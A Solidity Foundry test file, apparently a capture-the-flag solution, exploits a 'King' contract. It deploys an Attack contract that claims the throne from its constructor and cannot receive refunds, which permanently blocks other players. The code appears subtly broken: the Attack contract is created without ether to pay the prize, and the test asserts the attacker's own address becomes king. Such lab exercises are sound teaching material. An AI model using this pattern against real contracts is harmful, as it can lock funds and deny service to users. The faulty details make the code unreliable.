// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "@forge-std/Test.sol";
import {King} from "../src/King.sol";

contract Attack {
    King public king;
    constructor(address payable kingAddress) payable {
        uint prize = King(kingAddress).prize();
        (bool ok,) = kingAddress.call{value: prize}("");
        require(ok, "call failed");
    }
}

contract KingTest is Test {
    King public kingContract;
    address public attacker;
    address public user;

    function setUp() public {
        attacker = vm.addr(1);
        user = vm.addr(2);
        kingContract =  new King{value: 100 wei}();    
    }
    function testExploit() public {
        vm.startPrank(attacker);
        Attack attack = new Attack(payable(kingContract));
        assertEq(kingContract._king(), attacker);
        vm.stopPrank();

        uint prize =  kingContract.prize();

        vm.startPrank(user);
        vm.expectRevert();
        payable(kingContract).call{value: prize}("");
        vm.stopPrank();
    }
}
